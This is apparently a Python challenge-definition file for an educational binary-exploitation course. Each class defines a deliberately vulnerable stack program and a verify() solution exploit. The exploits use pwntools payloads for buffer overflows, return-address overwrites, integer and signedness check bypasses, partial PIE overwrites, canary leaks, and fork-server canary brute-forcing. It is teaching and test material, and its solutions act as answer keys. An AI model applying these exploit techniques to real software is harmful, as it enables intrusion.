import pwnshop
import signal
import pwn
import re

from pwnshop import Challenge, retry

class BabyMemBase(Challenge, register=False):
    PIE = False
    CANARY = False

    TEMPLATE_PATH = "babymem/babymem.c"

    challenge_function = True
    print_greeting = False
    constant_goodbye = False

    dump_final_stack = True

    win_variable = False
    win_value = None
    mmap_overflow = False

    win_function = True
    win_function_authed = True

    size_type = "unsigned long"
    size_cast = "unsigned long"
    size_fmt = "%lu"
    size_check = False

    flag_by_input = False
    echo_input = False
    echo_fmt = "%s"
    uninitialized_input = False

    payload_size = 0x1000

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.input_size = self.random.randrange(16, 128)
        self.bin_padding = self.random.randrange(0x10, 0x1000)

        if self.mmap_overflow:
            self.mmap_padding = self.random.randrange(2, 8)


class BabyMemBasicBufferOverflow(BabyMemBase):
    """
    Overflow a buffer on the stack to set the right conditions to obtain the flag!
    """
    PIE = False
    CANARY = True

    win_variable = True
    win_function_authed = False

    def verify(self, **kwargs):
        """
        Overflow a stack buffer to clobber a win variable, which when set will print the flag out.
        """
        with self.run_challenge(**kwargs) as process:
            payload = b"A" * 0x1000
            process.send(payload)
            assert self.flag in process.readall()

class BabyMemBasicBufferOverflowCareful(BabyMemBase):
    """
    Overflow a buffer on the stack to set the right conditions to obtain the flag!
    """
    PIE = False
    CANARY = True

    win_variable = True
    win_function_authed = False
    lose_variable = True

    def verify(self, **kwargs):
        """
        Overflow a stack buffer to clobber a win variable, which when set will print the flag out.
        """
        with self.run_challenge(**kwargs) as process:
            payload = b"A" * pwn.align(4, self.input_size) + b"A"*4
            process.send(payload)
            assert self.flag in process.readall()

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * pwn.align(4, self.input_size) + b"A"*9
            process.send(payload)
            assert self.flag not in process.readall()

class BabyMemBasicBufferOverflowInt(BabyMemBase):
    """
    Overflow a buffer on the stack to set trickier conditions to obtain the flag!
    """
    PIE = False
    CANARY = True

    win_variable = True
    win_function_authed = False
    lose_variable = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.win_value = self.random.randrange(1, 2**31)

    def verify(self, **kwargs):
        """
        Overflow a stack buffer to clobber a win variable, which when set will print the flag out.
        """
        with self.run_challenge(**kwargs) as process:
            payload = b"A" * pwn.align(4, self.input_size) + pwn.p64(self.win_value)
            process.send(payload)
            assert self.flag in process.readall()

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * pwn.align(4, self.input_size) + pwn.p64(self.win_value+1)
            process.send(payload)
            assert self.flag not in process.readall()


class BabyMemOverflowReturnAddress(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag!
    """
    win_function_authed = False
    PIE = False

    def verify(self, **kwargs):
        """
        Overflow a buffer on the stack to clobber the return address and jump to win()
        """
        elf = pwn.ELF(self.bin_path)

        with self.run_challenge(**kwargs) as process:
            payload = pwn.cyclic(0x1000)
            process.send(payload)
            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(elf.symbols["win"])
            process.send(payload)
            assert self.flag in process.readall()


class BabyMemSignednessOverflow(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
    """
    win_function_authed = False
    size_type = "int"
    size_cast = "unsigned int"
    size_fmt = "%i"
    size_check = True
    payload_size = None
    PIE = False

    @retry(16)
    def verify(self, **kwargs):
        """
        Trick a size check by inputting a negative size (cast to unsigned), then same as BabyMemBufferOverflowReturnAddress.
        """
        elf = pwn.ELF(self.bin_path)

        with self.run_challenge(**kwargs) as process:
            process.readuntil("Payload size: ")
            process.sendline("-1")

            process.readuntil("Send your payload")

            assert b"ERROR" not in process.clean()

            payload = pwn.cyclic(0x1000)
            process.send(payload)

            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(elf.symbols["win"])

            process.readuntil("Payload size: ")
            process.sendline("-1")

            process.readuntil("Send your payload")

            assert b"ERROR" not in process.clean()

            process.send(payload)

            assert self.flag in process.readall()


class BabyMemIntegerOverflow(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
    """
    win_function_authed = False
    multiple_records = True
    size_type = "unsigned long long"
    payload_size = None
    PIE = False

    @retry(16)
    def verify(self, **kwargs):
        """
        Trick a size check by overflowing an integer (MAX_INT + 1), then same as BabyMemBufferOverflowReturnAddress.
        """
        elf = pwn.ELF(self.bin_path)

        with self.run_challenge(**kwargs) as process:
            process.readuntil("Number of payload records to send: ")
            process.sendline(str(2 ** 32 // 2))
            process.readuntil("Size of each payload record: ")
            process.sendline("2")

            process.readuntil("Send your payload")

            assert b"ERROR" not in process.clean()

            payload = pwn.cyclic(0x1000)
            process.send(payload)

            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))

        with self.run_challenge(**kwargs) as process:
            process.readuntil("Number of payload records to send: ")
            process.sendline(str(2 ** 32 // 2))
            process.readuntil("Size of each payload record: ")
            process.sendline("2")

            process.readuntil("Send your payload")

            assert b"ERROR" not in process.clean()

            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(elf.symbols["win"])
            process.send(payload)

            assert self.flag in process.readall()

def win_bypass_auth(elf):
    win_start = elf.symbols["win_authed"]
    epilogue = b"\xc9\xc3"
    for ret_addr in elf.search(epilogue):
        if ret_addr > win_start:
            win_end = ret_addr
            break

    win_disasm = elf.disasm(win_start, win_end - win_start)
    win_lea_addrs = [
        int(e, 16) for e in re.findall(r"\s+([0-9a-f]+).*lea.*", win_disasm)
    ]
    assert win_lea_addrs
    return win_lea_addrs[0]


class BabyMemOverflowBypassAuth(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
    """

    PIE = False

    def verify(self, **kwargs):
        """
        Bypass an authorization check in the win_authed function by returning past it after an overflow.
        """
        elf = pwn.ELF(self.bin_path)

        with self.run_challenge(**kwargs) as process:
            payload = pwn.cyclic(0x1000)
            process.send(payload)
            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))

        with self.run_challenge(**kwargs) as process:
            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(win_bypass_auth(elf))
            process.send(payload)
            assert self.flag in process.readall()


class BabyMemOverflowPIE(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!
    """
    PIE = True

    def verify(self, **kwargs):
        """
        Overflow to the win function in a PIE binary (overwrite last 3 nibbles)
        """
        elf = pwn.ELF(self.bin_path)

        with self.run_challenge(**kwargs) as process:
            payload = pwn.cyclic(0x1000)
            process.send(payload)
            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))

        for _ in range(256):
            with self.run_challenge(**kwargs, alarm=1) as process:
                payload = b"A" * saved_rbp_offset
                payload += b"B" * 8
                payload += pwn.p64(win_bypass_auth(elf))[:2]
                process.send(payload)

                if self.flag in process.readall():
                    break
        else:
            assert False


class BabyMemOverflowPIEStrlenCheck(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary with an additional check on your input.
    """
    PIE = True
    string_confusion_input = True

    def verify(self, **kwargs):
        """
        Overflow to the win function in a PIE binary (overwrite last 3 nibbles), input is first placed on heap and strlen'd before copying, null byte in front to defeat check.
        """
        elf = pwn.ELF(self.bin_path)

        with self.run_challenge(**kwargs, env={"padding": "A" * 0x1000}) as process:
            payload = b"\0" + pwn.cyclic(0x1000)
            process.send(payload)

            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp)) + 1

        for _ in range(256):
            with self.run_challenge(**kwargs, alarm=1) as process:
                payload = b"\0" + b"A" * (saved_rbp_offset - 1)
                payload += b"B" * 8
                payload += pwn.p64(win_bypass_auth(elf))[:2]
                process.send(payload)

                if self.flag in process.readall():
                    break
        else:
            assert False


class BabyMemOverflowJumpCanary(BabyMemBase):
    """
    Overflow a buffer and smash the stack to obtain the flag, but this time in a PIE binary with a stack canary. Be warned, this requires careful and clever payload construction!
    """
    PIE = True
    CANARY = True

    payload_size = None
    multi_read = True

    @pwnshop.retry(16, timeout=30)
    def verify(self, **kwargs):
        """
        Read 1 byte at a time using local variable n as an offset, which can be set to skip over the canary and write to the return address.
        """
        elf = pwn.ELF(self.bin_path)

        padded_input_size = self.input_size
        if padded_input_size % 4 != 0:
            padded_input_size += 4 - (padded_input_size % 4)

        for canary_offset in range(padded_input_size + 1 + 1, 0x100):
            with self.run_challenge(**kwargs) as process:
                process.readuntil("Payload size: ")
                size = str(canary_offset + 1 + 1)
                process.sendline(size)
                process.readuntil(f"Send your payload (up to {size} bytes)!\n")

                payload = b"A" * padded_input_size
                payload += bytes([canary_offset])
                payload += b"B"
                process.send(payload)

                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        for _ in range(256):
            with self.run_challenge(**kwargs, alarm=1) as process:
                process.readuntil("Payload size: ")
                size = str(canary_offset + 1 + 16 + 2)
                process.sendline(size)
                process.readuntil(f"Send your payload (up to {size} bytes)!\n")

                payload = b"A" * padded_input_size
                payload += bytes([canary_offset + 16])
                payload += pwn.p64(win_bypass_auth(elf))[:2]
                process.send(payload)

                if self.flag in process.readall():
                    break
        else:
            assert False


class BabyMemOverflowLeak(BabyMemBase):
    """
    Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
    """
    PIE = True
    CANARY = True

    dump_final_stack = False
    win_function = False
    flag_by_input = True
    echo_input = True

    def verify(self, **kwargs):
        """
        Read bytes to run up against flag variable on stack, which is then leaked when printed afterwards.
        """
        with self.run_challenge(**kwargs) as process:
            payload = b"A" * self.input_size
            process.send(payload)
            assert self.flag in process.readall()


class BabyMemOverflowMmapPagesLeak(BabyMemBase):
    """
    Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
    """
    PIE = True
    CANARY = True

    dump_final_stack = False

    win_function = False
    mmap_overflow = True
    flag_by_input = True
    echo_input = True
    payload_size = None

    def verify(self, **kwargs):
        """
        Read bytes to run up against flag variable across mmap'd buffers, which is then leaked when printed afterwards.
        """
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Payload size: ")
            size = str(0x1000 * (self.mmap_padding + 1))
            process.sendline(size)
            process.readuntil(f"Send your payload (up to {size} bytes)!\n")

            payload = b"A" * (0x1000 * (self.mmap_padding + 1))
            process.send(payload)
            assert self.flag in process.readall()


class BabyMemOverflowLeakCanaryRepeatBackdoor(BabyMemBase):
    """
    Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.
    """
    PIE = True
    CANARY = True
    repeat_backdoor = True
    echo_input = True

    def verify(self, **kwargs):
        """
        Read bytes to run up against the canary and use the "REPEAT" backdoor to re-input it.
        """
        elf = pwn.ELF(self.bin_path)

        # find the canary
        for canary_distance in range(self.input_size, 0x1000):
            with self.run_challenge(**kwargs) as process:
                process.send(b"A" * canary_distance)
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        for _ in range(256):
            with self.run_challenge(**kwargs) as process:
                payload = b"REPEAT".ljust(canary_distance, b"A")
                process.send(payload)

                process.readuntil("You said: ")
                canary = (
                    b"\0"
                    + process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 7]
                )
                if len(canary) < 8:
                    return self.verify(**kwargs)

                final_payload = (
                    b"A" * (canary_distance - 1)
                    + canary
                    + b"B" * 8
                    + pwn.p64(win_bypass_auth(elf))[:2]
                )

                process.send(final_payload)

                if self.flag in process.readall():
                    break
        else:
            assert False


class BabyMemLeakFlagLeftInMemory(BabyMemBase):
    """
    Leak data left behind unintentionally by utilizing clever payload construction.
    """
    PIE = True
    CANARY = True
    echo_input = True
    uninitialized_input = True
    verify_flag = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.input_size = self.random.randrange(256, 512)
        self.echo_fmt = f"%.{self.input_size}s"
        self.flag_padding = self.random.randrange(32, 128)

    def verify(self, **kwargs):
        """
        Flag is left in memory after a previous function call, read bytes to run up against it in memory and leak it.
        """
        for i in range(1, self.input_size):
            with self.run_challenge(**kwargs) as process:
                process.send(b"A" * i)
                if self.flag in process.readall():
                    break
        else:
            assert False


class BabyMemLeakCanaryUninitializedRepeatBackdoor(BabyMemBase):
    """
            Leak data left behind unintentionally to defeat a stack canary in a PIE binary.
    """
    PIE = True
    CANARY = True
    repeat_backdoor = True
    echo_input = True
    uninitialized_input = True
    print_greeting = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.input_size = self.random.randrange(256, 512)
        self.echo_fmt = f"%.{self.input_size}s"

    @pwnshop.retry(16, timeout=30)
    def verify(self, **kwargs):
        """
        Read bytes to run up against the canary and leak it, it's left in memory, then use "REPEAT" backdoor.
        """
        elf = pwn.ELF(self.bin_path)

        # find the distance to the canary
        for canary_distance in range(self.input_size, 0x1000):
            with self.run_challenge(**kwargs) as process:
                process.send(b"A" * canary_distance)
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        for _ in range(1024):
            with self.run_challenge(**kwargs) as process:
                uninitialized_canary_distance = self.random.randrange(0, self.input_size, 8) + 9
                payload = b"REPEAT".ljust(uninitialized_canary_distance, b"A")
                process.send(payload)

                process.readuntil("You said: ")
                canary = b"\0" + process.readline()[len(payload) : len(payload) + 7]

                if len(canary) < 8 or b"\n" in canary:
                    continue

                break
        else:
            assert False

        for _ in range(1024):
            with self.run_challenge(**kwargs) as process:
                payload = b"REPEAT".ljust(uninitialized_canary_distance, b"A")
                process.send(payload)

                process.readuntil("You said: ")
                canary = b"\0" + process.readline()[len(payload) : len(payload) + 7]

                if len(canary) < 8 or b"\n" in canary:
                    continue

                final_payload = (
                    b"A" * (canary_distance - 9)
                    + b"C" * 8
                    + canary
                    + b"B" * 8
                    + pwn.p64(win_bypass_auth(elf))[:2]
                )

                process.send(final_payload)

                if self.flag in process.readall():
                    break
        else:
            assert False


class BabyMemForkServerCanaryBruteforce(BabyMemBase):
    """
    Defeat a stack canary in a PIE binary by utilizing a network-style fork server in the target binary.
    """
    PIE = True
    CANARY = True

    fork_server = True

    @pwnshop.retry(4, timeout=120)
    def verify(self, **kwargs):
        """
        Brute force the stack canary by utilizing a fork server in the binary.
        """
        elf = pwn.ELF(self.bin_path)

        canary = b"\x00"
        with self.run_challenge(**kwargs) as process:
            process.readuntil(
                "This challenge is listening for connections on TCP port 1337."
            )

            for canary_offset in range(self.input_size, self.input_size + 0x100):
                with pwn.remote(self.hostname, 1337) as remote:
                    payload = b"A" * (canary_offset + 1)
                    remote.send(payload)

                    response = remote.clean()
                    if b"*** stack smashing detected ***" in response:
                        break
            else:
                assert False

            for _ in range(7):
                for b in range(256):
                    with pwn.remote(self.hostname, 1337) as remote:
                        payload = b"A" * canary_offset
                        payload += canary + bytes([b])
                        remote.send(payload)

                        response = remote.clean()
                        if b"*** stack smashing detected ***" in response:
                            pass
                        else:
                            canary += bytes([b])
                            break
                else:
                    assert False

            for i in range(16):
                with pwn.remote(self.hostname, 1337) as remote:
                    payload = b"A" * canary_offset
                    payload += canary
                    payload += b"B" * 8
                    payload += pwn.p64(win_bypass_auth(elf) + (i << 12))[:2]
                    remote.clean()
                    remote.send(payload)
                    response = remote.clean()
                    if b"You win!" in response:
                        assert self.flag in response
                        break
            else:
                assert False
